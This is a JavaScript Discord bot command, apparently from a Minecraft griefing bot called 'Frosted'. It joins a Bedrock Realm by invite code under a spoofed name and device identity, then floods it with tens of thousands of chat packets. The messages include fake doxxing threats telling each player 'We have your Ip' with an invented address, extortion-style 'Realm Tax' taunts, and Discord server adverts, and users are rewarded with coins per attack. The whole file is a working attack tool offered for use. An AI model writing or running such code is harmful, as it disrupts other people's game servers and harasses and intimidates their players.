const fs = require('fs');
const { SlashCommandBuilder } = require('discord.js');
const bedrock = require('bedrock-protocol');
const { RealmAPI } = require('prismarine-realms');
const { Authflow } = require('prismarine-auth');
const { setTimeout } = require('timers/promises');
const skinData = require('../../data/jenny.json');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { checkAndSaveRealm,saveCoins } = require('../functions/realms.js')
const { cat1, error, loading, replystart, replyend } = require('../../data/emojie');
const { discordInvite, discordlink, footer, waterwark } = require('../../data/config');
const ipAddresses = [
    '209.174.101.87', '55.92.101.28', '224.67.224.238', '70.120.73.88', '92.81.151.96',
    '251.116.158.83', '217.80.15.108', '90.12.199.8', '156.7.83.71', '173.201.76.185',
    '143.160.19.168', '133.247.28.252', '42.232.206.193', '245.238.82.196', '241.216.39.238',
    '239.9.11.189', '169.149.45.61', '52.81.83.111', '75.51.153.212', '178.118.210.224'
];

const playerIPMap = {};

function assignIPToPlayer(playerName) {
    if (playerIPMap[playerName]) {
        return playerIPMap[playerName];
    }
    const availableIP = ipAddresses.find(ip => !Object.values(playerIPMap).includes(ip));
    if (availableIP) {
        playerIPMap[playerName] = availableIP;
        return availableIP;
    } else {
        console.log('No available IP addresses left!');
        return null;
    }
}

module.exports = {
    command: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Spams realm with a message')
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('Realm Code To Spam')
                .setRequired(true)
                .setMinLength(11)
        )
        .addStringOption(option =>
            option.setName('namespoof_name')
                .setDescription('The Name you wanna use for Namespoof (Premium only)')
                .setRequired(false)),

        execute: async (interaction) => {
        
            try {
                await interaction.deferReply({ ephemeral: false });
                const link = discordInvite;
                const rainbowLink = rainbowText(link);
                const userId = interaction.user.id;
                const userTag = interaction.user.tag;
                const realmCode = interaction.options.getString('realmcode');
                const name = interaction.options.getString('namespoof_name') || ""
                const userIdentifier = undefined;
                const profilesFolder = `./authCache/${userId}`;
                const options = { authTitle: '00000000441cc96b', flow: 'live' };
                const authFlow = new Authflow(userIdentifier, profilesFolder, options);
                const realms = RealmAPI.from(authFlow, 'bedrock');
                const realm = await realms.getRealmFromInvite(realmCode);
                const realmName = realm?.name || 'Unknown';
                const external = interaction.options.getBoolean('external');
                const duration = 120
                const baseCoins = 20;
                const bonusCoins = Math.floor(duration / 20) * 100;
                const totalCoins = baseCoins + bonusCoins;
               

            if (!fs.existsSync(profilesFolder)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `${error} Account Not Linked ${error} `,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: {
                                text: `${interaction.user.username} | discord.gg/frosted`,
                                iconURL: interaction.user.displayAvatarURL(),
                            },
                        },
                    ],
                });
                return;
            }

            const embed = {
                title: `${cat1} Connecting to Realm: ${realmName} ${cat1}`,
                description: '',
                footer: { text: 'Attempting connection...' },
            };
            await interaction.editReply({ embeds: [embed] });

            const client = bedrock.createClient({
                profilesFolder,
                profilesFolder: profilesFolder,
                skinData: {
                    CurrentInputMode: 3,
                    DefaultInputMode: 3,
                    DeviceOS: 11,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: generateRandomString(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: name,
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                },
                skipPing: true,
                realms: {
                    [realmCode.length === 8 ? "realmId" : "realmInvite"]: realmCode.length === 8 ? realmCode : `${realmCode}`,
                },
            });

            client.on('join', async () => {
            checkAndSaveRealm(realmCode, userId)
            saveCoins(userId, totalCoins); 
                try {
                    const updatedEmbed = {
                        title: `${cat1} Connected to: ${realmName} ${cat1}`,
                        description: `${replystart}Successfully joined the Realm as ${name}\n${replystart}Realm Code: ${realmCode}\n${replyend}You will earn **${totalCoins} coins**`,
                        footer: {
                            text: `${interaction.user.username} | discord.gg/frosted`,
                            iconURL: interaction.user.displayAvatarURL(),
                        },
                    };
                    await interaction.editReply({ embeds: [updatedEmbed] });
                    console.log(`Connected to Realm: ${realmName} (${realmCode})`);
                } catch (error) {
                    console.error(`Error Realm: ${error.message}`);
                }
            });

            client.on('player_list', (packet) => {
                const players = packet.records.records.map(player => player.username);
                players.forEach(player => {
                    const ip = assignIPToPlayer(player);
                    console.log(`${player} assigned IP: ${ip}`);
                });
            });

            client.on('start_game', async (packet) => {
                const spamEmbed = {
                    title: `${cat1} Spamming ${realmName} ${cat1}`,
                    description: `${replystart}Successfully Spamming the Realm as ${name}\n${replyend}Realm Code: ${realmCode}`,
                    footer: {
                        text: `${interaction.user.username} | discord.gg/frosted`,
                        iconURL: interaction.user.displayAvatarURL(),
                    },
                };
                await interaction.editReply({ embeds: [spamEmbed] });

                function spam1() {
                    const packetCount = 50000
                    let messageCount = 0;
                    const interval = setInterval(() => {
                        if (messageCount >= packetCount) {
                            clearInterval(interval);
                            return;
                        }

                
                        for (let i = 0; i < 50000 && messageCount < packetCount; i++) {
                            for (let playerName in playerIPMap) {
                                const ip = playerIPMap[playerName];
                                client.write('command_request', {
                                    command: `/me @${playerName} §c§ We have your Ip: §2§ ${ip}`,
                                    origin: { type: 0, uuid: '5', request_id: 'TSL Nuker' },
                                    internal: false, version: 66
                                });
                                client.write('command_request', {
                                    command: `/me §4§ Frosted on TOP`,
                                    origin: { type: 0, uuid: '5', request_id: 'TSL Nuker' },
                                    internal: false, version: 66
                                });
                                client.write('command_request', {
                                    command: `/me §6§ This Realm did not pay Realm Tax\n §2§ ${discordInvite}`,
                                    origin: { type: 0, uuid: '5', request_id: 'TSL Nuker' },
                                    internal: false, version: 66
                                });
                                messageCount++;
                            }
                        }
                    }, 1);

                    setTimeout(() => {
                        client.disconnect();
                        const disconnect = {
                            title: `${cat1} Connected to: ${realmName} ${cat1}`,
                            description: `${replystart}Successfully disconnect from the Realm as ${name}\n${replyend}Realm Code: ${realmCode}`,
                            fields: [
                                { name: 'Left After :', value: `5 Second`, inline: false },
                                { name: 'Sended ', value: `${packetCount} Packets`, inline: false },
                            ],
                            footer: {
                                text: `${interaction.user.username} | discord.gg/frosted`,
                                iconURL: interaction.user.displayAvatarURL(),
                            },
                        };
                     interaction.editReply({ embeds: [disconnect] });
                        console.log(`Disconnected from ${realmCode}`);
                    }, 3000);
                }
        
                spam1();
            });

            client.on('kick', async (reason) => {
                await interaction.editReply({
                    embeds: [
                        {
                            title: 'Client Kicked',
                            description: 'Client got kicked from the Realm.',
                            color: 0xffa500,
                            fields: [
                                { name: 'Reason', value: parseKickMessage(reason.message) },
                            ],
                            footer: {
                                text: `${interaction.user.username} | discord.gg/frosted`,
                                iconURL: interaction.user.displayAvatarURL(),
                            },
                        },
                    ],
                });
               });

            client.on('error', async (err) => {
                console.error(err);
                await interaction.followUp({
                    embeds: [
                        {
                            title: 'Error Occurred',
                            description: 'An error occurred while connecting to the Realm.',
                            color: 0xff0000,
                            fields: [
                                { name: 'Reason', value: err.message || 'Unknown error' },
                            ],
                            footer: {
                                text: `${interaction.user.username} | discord.gg/frosted`,
                                iconURL: interaction.user.displayAvatarURL(),
                            },
                        },
                    ],
                });
            });
        } catch (error) {
            console.error(error);

            const errorEmbed = {
                title: 'Error Occurred',
                description: 'The bot encountered an issue while joining the Realm.',
                color: 0xff0000,
                fields: [
                    { name: 'Reason', value: error.message || 'Unknown error', inline: false },
                ],
                footer: {
                    text: `${interaction.user.username} | discord.gg/frosted`,
                    iconURL: interaction.user.displayAvatarURL(),
                },
            };

            await interaction.editReply({ embeds: [errorEmbed] });
        }
    },
};

function parseKickMessage(message) {
    return message;
}

function generateRandomString(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function colorizeText(text) {
    const words = text.split(' ');
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });
    return coloredWords.join(' ');
}

function randomCode() {
    const optionsString = "1234567890";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§" + randomOption;
}

function rainbowText(text) {
    const colors = ['§c', '§6', '§e', '§a', '§b', '§9', '§d', '§f'];
    let rainbowedText = '';
    
    for (let i = 0; i < text.length; i++) {
        rainbowedText += colors[i % colors.length] + text[i];
    }
    return rainbowedText;
}